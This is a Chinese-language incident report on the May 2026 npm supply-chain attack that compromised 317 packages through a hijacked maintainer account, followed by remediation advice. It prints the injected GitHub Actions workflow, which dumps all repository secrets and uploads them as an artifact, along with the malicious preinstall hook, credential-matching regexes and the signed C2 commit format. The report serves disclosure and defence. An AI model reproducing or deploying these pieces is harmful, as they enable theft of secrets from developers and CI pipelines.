# 洞察报告：Mini Shai-Hulud 再次出击 - 317个npm包被攻陷

**洞察链接**: https://safedep.io/mini-shai-hulud-strikes-again-314-npm-packages-compromised/

**发布日期**: 2026年5月19日

**来源**: SafeDep Team

---

## 摘要

2026年5月19日，npm账户`atool`（邮箱：`atool@atool.dev`）遭到攻击者入侵。攻击者在22分钟内自动发布了637个恶意版本，覆盖317个npm包。这些受影响的高流行量包包括：

- `size-sensor`：420万次/月下载
- `echarts-for-react`：380万次/月下载
- `@antv/scale`：220万次/月下载
- `timeago.js`：115万次/月下载

恶意载荷是一个498KB的混淆Bun脚本，与三周前SAP妥协事件中使用的"Mini Shai-Hulud"工具包完全匹配：相同的扫描器架构、相同的凭证正则表达式集、相同的混淆模式。

## 攻击概述

### 账户被攻陷与影响范围

`atool` npm账户维护547个包。攻击者在两次自动化浪潮中发布了637个恶意版本：

| 浪潮 | 时间（UTC） | 发布版本数 | 模式 |
|------|-------------|-------------|------|
| 第一波 | 01:39 - 01:56 | 约317个 | 初始burst，01:39-01:49间有4个早期测试发布 |
| 第二波 | 02:05 - 02:06 | 约314个 | 跨相同包的第二轮版本更新 |

大多数包（309个）收到了2个恶意版本，4个包收到了3个版本（包括`size-sensor`、`echarts-for-react`、`jest-canvas-mock`、`jest-date-mock`），表明它们在批量发布前被用于早期测试。

### 执行触发器

每个被攻陷的版本对`package.json`做了两处修改：

1. **preinstall钩子**：添加`"preinstall": "bun run index.js"`
2. **可选依赖**：注入`@antv/setup: github:antvis/G2#<commit-sha>`

## 恶意载荷分析

### 载荷结构

`index.js`是一个单行498KB的混淆Bun bundle。结构与三周前的SAP妥协事件中的Mini Shai-Hulud载荷完全匹配：

- 相同的Bun运行时要求
- 相同的十六进制变量混淆模式
- 相同的扫描器架构（100KB刷新阈值）
- 相同的凭证正则表达式集

载荷使用两层混淆：十六进制变量查找表和加密字符串解码器（`fc2edea72`），使用base64 + XOR处理所有敏感字符串。

### 凭证收集

载荷读取80+个环境变量（通过`fc2edea72`加密），并使用正则表达式扫描文件内容。目标包括：

- **GitHub令牌**: `gh[p o]_[A-Za-z0-9]{36,}`
- **npm令牌**: `npm_[A-Za-z0-9]{36,}`
- **AWS密钥**: `AKIA[0-9A-Z]{16}`等
- **GCP服务账户密钥**
- **Azure凭据**
- **数据库连接字符串**: MongoDB、MySQL、PostgreSQL、Redis
- **Stripe密钥**: `sk|pk_(test|live)_[0-9a-zA-Z]{24,}`
- **SSH密钥**: `ssh-rsa`、`ssh-ed25519`等
- **Docker认证**
- **Vault令牌**: `hvs\.[A-Za-z0-9_-]{24,}`
- **Kubernetes服务账户令牌**

### 云基础设施目标

载荷还主动探测云基础设施API：

1. **AWS凭证链**：环境变量 → 配置文件 → EC2 IMDS → ECS容器凭据 → AWS Secrets Manager
2. **HashiCorp Vault**：搜索8个位置的Vault令牌
3. **Kubernetes**：读取服务账户令牌和kubeconfig
4. **Docker**：容器逃逸尝试

## 命令与控制（C2）

### GitHub API作为C2通道

载荷不联系攻击者控制的服务器，而是使用GitHub自己的API作为渗透通道：

- **C2 URL**: `https://api.github.com`
- **User-Agent**: `python-requests/2.31.0`（伪装为Python HTTP库）

### 渗透管道

三阶段渗透流程：

1. **令牌验证**：调用`GET /user`验证被盗GitHub令牌，检查`x-oauth-scopes`头
2. **渗透仓库创建**：使用Dune主题命名模式（`{word1}-{word2}-{number}`）创建新的公开仓库
3. **数据渗透为Git对象**：使用Git Data API将被盗凭据提交为blob、tree、commit

仓库命名模式示例：`harkonnen-melange-742`、`fremen-sandworm-315`

## CI/CD攻击

### npm令牌滥用和OIDC交换

在GitHub Actions环境中，载荷尝试将GitHub Actions OIDC令牌交换为npm发布令牌：

```
https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/<package-name>
```

### Sigstore滥用

载荷包含完整的Sigstore签名实现，可使用被盗OIDC令牌签署工件，创建指向被攻陷CI管道身份的信任链。

### 工作流注入

载荷向可访问的仓库注入恶意GitHub Actions工作流：

```yaml
name: Run Copilot
on: push
jobs:
  format:
    runs-on: ubuntu-latest
    env:
      VARIABLE_STORE: ${{ toJSON(secrets) }}
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - name: Copilot Setup
        run: echo "$VARIABLE_STORE" > format-results.txt
      - uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f16
        with:
          name: format-results
          path: format-results.txt
```

工作流将所有仓库密钥作为JSON转储到`format-results.txt`并上传为工件。完成后，载荷删除工作流运行并重置分支以消除证据。

## 持久化和GitHub隐蔽C2

### systemd/LaunchAgent持久化

在Linux上创建systemd用户服务`kitty-monitor.service`，在macOS上创建LaunchAgent `com.user.kitty-monitor.plist`。

### GitHub隐蔽C2后门

`cat.py`守护进程每小时轮询GitHub搜索API，查找包含关键字`firedalazer`的提交：

```
firedalazer <base64_url>.<base64_signature>
```

提交消息格式为RSA-PSS签名命令。守护进程验证签名，下载URL，并以Python执行内容。

使用RSA签名防止第三方劫持C2通道。攻击者可以通过在任意公开GitHub仓库创建带有有效RSA-PSS签名的`firedalazer`关键字提交来向所有受感染机器推送新命令。

## GitHub伪装提交

630个恶意版本包含指向`antvis/G2`仓库特定提交的`optionalDependencies`条目：

```json
{
  "optionalDependencies": {
    "@antv/setup": "github:antvis/G2#1916faa365f2788b6e193514872d51a242876569"
  }
}
```

### 伪装提交详情

三个提交SHAs被推送到`antvis/G2`：

| 提交SHA | 创建时间（UTC） | 载荷大小 | 使用版本数 |
|---------|-----------------|----------|-----------|
| 1916faa365f2 | 01:25:54 | 499,328字节 | 626 |
| 7cb42f57561c | 01:42:14 | 498,060字节 | 2 |
| dc3d62a2181b | 01:47:31 | 未知（已GC） | 1 |

- 所有提交都是孤儿提交（零父节点）
- 作者被伪造为`huiyu.zjt <alexzjt@users.noreply.github.com>`（真正的Ant Group员工）
- 攻击者无需对`antvis/G2`的写权限
- 利用GitHub的fork对象共享功能

这与Chainguard记录的GitHub Actions（伪装提交绕过action allowlists）漏洞相同，但应用于npm的`github:`依赖解析。

## 建议措施

1. **检查lockfile**：检查`package-lock.json`或`pnpm-lock.yaml`中2026-05-19发布的任何版本
2. **轮换凭据**：如果安装了被攻陷版本，轮换所有可从构建环境访问的凭据（npm令牌、GitHub PAT、AWS密钥、SSH密钥、云提供商凭据、数据库密码、Vault令牌、Kubernetes服务账户令牌）
3. **检查仓库**：检查GitHub账户下是否创建了未经授权的公开仓库
4. **审计npm OIDC**：检查npm OIDC令牌交换日志，查找CI管道的未经授权包发布
5. **验证Sigstore**：验证透明度日志条目，查找被攻陷CI身份签署的任何工件
6. **本地检查**：检查本地Node.js项目中注入的`.claude/settings.json`钩子、`.vscode/tasks.json`自动运行任务和`.claude/setup.mjs`引导脚本
7. **删除守护进程**：删除名为`kitty-monitor`的systemd用户服务和名为`com.user.kitty-monitor`的LaunchAgent
8. **文件清理**：检查并删除`~/.local/share/kitty/cat.py`（C2守护进程）、`/var/tmp/.gh_update_state`（执行状态）和`~/.local/bin/gh-token-monitor.sh`（token轮询守护进程）
9. **固定依赖**：使用lockfile固定依赖，防止semver范围解析到恶意版本
10. **审计CI/CD**：审计Docker socket暴露和EC2元数据访问

## 结论

这次事件是由一个被攻陷的维护者账户驱动的。`atool`账户在5月19日之前发布了这些包的干净版本。22分钟内跨317个包（637个版本）的发布burst，加上相同的混淆载荷，排除渐进式或有针对性的操作。攻击者使用被盗令牌自动化了整个浪潮。

这次攻击暴露了npm信任模型的结构性弱点：一个被攻陷的令牌会在数百个包中级联，影响数百万下游用户。Lockfile和签名验证仍然是主要防御手段。
